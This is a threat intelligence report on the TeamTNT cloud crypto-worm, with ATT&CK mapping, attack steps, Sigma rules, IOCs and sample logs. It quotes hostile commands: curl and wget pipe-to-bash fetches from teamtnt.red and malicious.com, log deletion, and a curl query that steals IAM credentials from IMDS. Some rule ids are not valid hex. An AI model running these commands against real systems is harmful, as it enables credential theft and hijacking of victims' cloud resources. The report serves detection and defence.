# TeamTNT AWS Threat Intel Report

THREAT LEVEL: HIGH

Subject: TeamTNT (Cloud-Native Crypto-Worm)

Author: Nihal

Date: December 24, 2025

## High-Level Summary

TeamTNT is a prominent threat group targeting cloud environments (AWS, Azure, GCP, Docker, Kubernetes). Unlike traditional malware that infects user workstations, TeamTNT spreads worm-like scripts to infect cloud servers. Their primary goal is **Resource Hijacking** (installing XMRig crypto-miners) and **Credential Theft**. They are famous for automating the theft of AWS credentials from the **EC2 Instance Metadata Service (IMDS)** and using them to move laterally or persist in the victim's cloud environment.

## Quick Look

| Attribute          | Details                                                               |
| :----------------- | :-------------------------------------------------------------------- |
| Threat Family      | TeamTNT / Chimaera                                                    |
| Attribution        | Cloud-Focused Cybercrime Group                                        |
| File Type          | Shell Scripts (`.sh`), ELF Binaries (Linux), Docker Images            |
| C2 Infrastructure  | IRC Bots, Pastebin (for config), Hardcoded IPs                        |
| Propagation Vector | Exposed Docker APIs, Kubernetes Dashboards, SSH Brute Force           |
| Targeted Assets    | AWS EC2 (Linux), ECS, S3 Buckets                                      |

## Threat at a Glance: Key ATT&CK TTPs Observed

*   **T1552.005 (Unsecured Credentials: Cloud Instance Metadata):** The malware queries `http://169.254.169.254` to steal IAM role credentials attached to the EC2 instance.
*   **T1496 (Resource Hijacking):** Deploys XMRig to mine Monero using the victim's CPU.
*   **T1087 (Account Discovery):** Scans for `~/.aws/credentials` and `.ssh/id_rsa`.
*   **T1562.001 (Impair Defenses):** Kills competing miners and disables cloud security agents (e.g., AliCloud Aegis).
*   **T1190 (Exploit Public-Facing Application):** Often enters via misconfigured Docker daemons (Port 2375).

## TeamTNT Deep Dive: Technical Analysis

### The Infection Script
The core "malware" is usually a shell script (e.g., `init.sh`, `aws.sh`). Once executed on a compromised Linux EC2 instance, it performs the following logic:

1.  **Persistence:** Adds a cron job to redownload itself every minute (`wget -qO - http://teamtnt.red/init.sh | bash`).
2.  **Defense Evasion:** Modifies `iptables` to block other malware ports and deletes logs (`rm -rf /var/log/syslog`).
3.  **Credential Theft (The "AWS Stealer"):**
    *   It runs `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` to find the IAM role name.
    *   It then queries the specific role to get `AccessKeyId`, `SecretAccessKey`, and `Token`.
    *   These credentials are sent to the attacker's C2.

### Cloud Impact
Once the attacker has the stolen credentials, they use them from *outside* the victim's environment. This generates a specific anomaly: Valid EC2 credentials being used from an external IP address (not the EC2 instance's IP).

## Comparative Analysis & Attack Journey

### Attack Journey Overview

1.  **Initial Access**
    The attacker scans for open Docker ports (2375) or weak SSH passwords.

2.  **Execution**
    A malicious container is spawned, or a script is run via SSH: `curl -s http://malicious.com/setup.sh | bash`.

3.  **Mining (The Distraction)**
    The script installs XMRig. CPU usage spikes to 100%.

4.  **Theft (The Real Threat)**
    While mining, the script silently queries the AWS Metadata Service.
    `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName > creds.txt`

5.  **Exfiltration**
    The `creds.txt` content is POSTed to the attacker's server.

6.  **Lateral Movement (Cloud)**
    The attacker configures their local AWS CLI with the stolen keys and attempts to launch more high-CPU instances (`RunInstances`) for mining or scans S3 buckets for data (`ListBuckets`).

## Actionable Detections and Threat Hunting

### Hunting for IMDS Access
Hunting for non-AWS processes (like `curl`, `wget`, or python scripts) accessing the IP `169.254.169.254` is the "Golden Rule" of cloud detection on the host.

### Sigma Rule (Linux Host)
Detects the shell command used to steal credentials.

```yaml
title: AWS Metadata Service Query via Curl
id: a1b2c3d4-e5f6-4789-0123-456789abcdef
status: stable
description: Detects curl or wget commands accessing the AWS Instance Metadata Service (IMDS) to retrieve IAM credentials.
author: Nihal
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    commandline|contains|all:
      - '169.254.169.254'
      - 'iam/security-credentials'
  condition: selection
level: critical
tags:
  - attack.credential_access
  - attack.t1552.005
```

### Sigma Rule (CloudTrail)
Detects the stolen credentials being used from an unexpected location.

```yaml
title: Stolen EC2 Credentials Used Externally
id: b2c3d4e5-f6g7-4890-1234-567890abcdef
status: stable
description: Detects when IAM credentials belonging to an EC2 instance are used from an IP address that does not match the instance's public IP (indicating theft).
author: Nihal
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    userIdentity.type: 'AssumedRole'
    userIdentity.principalId|contains: ':' # Usually RoleID:InstanceID
  filter_internal:
    sourceIPAddress|startswith: 
      - '10.'
      - '172.'
      - '192.168.'
  condition: selection and not filter_internal
level: high
```

## Indicators of Compromise (IOCs)

| Type          | Indicator                                         | Context                     |
| :------------ | :------------------------------------------------ | :-------------------------- |
| **Domain**    | `teamtnt.red`                                     | C2 / Payload Delivery       |
| **IP Address**| `169.254.169.254`                                 | Target (Metadata Service)   |
| **Filename**  | `bioset`, `kinsing`                               | Mining Binaries             |
| **Hash**      | `c1d2e3f4...`                                     | XMRig Miner Hash            |
| **User Agent**| `tnt/1.0`                                         | Custom User Agent used by script |

## Platform Things

### Event Logs (Hybrid)

**1. Linux Syslog (The Theft):**
```text
eventdate,hostname,user,processid,image,processcommandline,targetfilename,targetobject,details,destinationip,destinationport,protocol,hashes
2025-12-23 03:00:01,PROD-WEB-01,root,1122,/usr/bin/curl,"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/WebRole",-,-,-,169.254.169.254,80,TCP,-
2025-12-23 03:00:05,PROD-WEB-01,root,1123,/bin/bash,"bash -c 'apt-get install -y xmrig'",-,-,-,-,-,-,-
```

**2. AWS CloudTrail (The Exploitation):**
```json
{
    "eventTime": "2025-12-23T03:05:00Z",
    "eventSource": "ec2.amazonaws.com",
    "eventName": "RunInstances",
    "awsRegion": "us-east-1",
    "sourceIPAddress": "103.100.100.5", 
    "userIdentity": {
        "type": "AssumedRole",
        "principalId": "AROAA...:i-0123456789abcdef0",
        "arn": "arn:aws:sts::123456789012:assumed-role/WebRole/i-0123456789abcdef0"
    },
    "requestParameters": {
        "instanceType": "c5.24xlarge"
    }
}
```

### Sigma Rules(2)

**Log Event (Linux):**
```text
2025-12-23 03:00:01,PROD-WEB-01,root,1122,/usr/bin/curl,"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/WebRole",-,-,-,169.254.169.254,80,TCP,-
```

```yaml
title: IMDS Credential Theft via Curl
id: c3d4e5f6-g7h8-4901-2345-678901abcdef
status: stable
description: Detects command line attempts to access AWS metadata for credentials.
author: Nihal
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    commandline|contains|all:
      - '169.254.169.254'
      - 'iam/security-credentials'
  condition: selection
level: critical
```

**Log Event (CloudTrail):**
```json
"eventName": "RunInstances", "sourceIPAddress": "103.100.100.5", "userIdentity": { "type": "AssumedRole" }
```

```yaml
title: High CPU Instance Launch by Assumed Role
id: d4e5f6g7-h8i9-4012-3456-789012abcdef
status: experimental
description: Detects an EC2 role launching a high-performance instance (often for mining), which is unusual for a web server role.
author: Nihal
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: 'RunInstances'
    userIdentity.type: 'AssumedRole'
    requestParameters.instanceType|contains: 
      - '24xlarge'
      - '16xlarge'
      - 'metal'
  condition: selection
level: medium
```
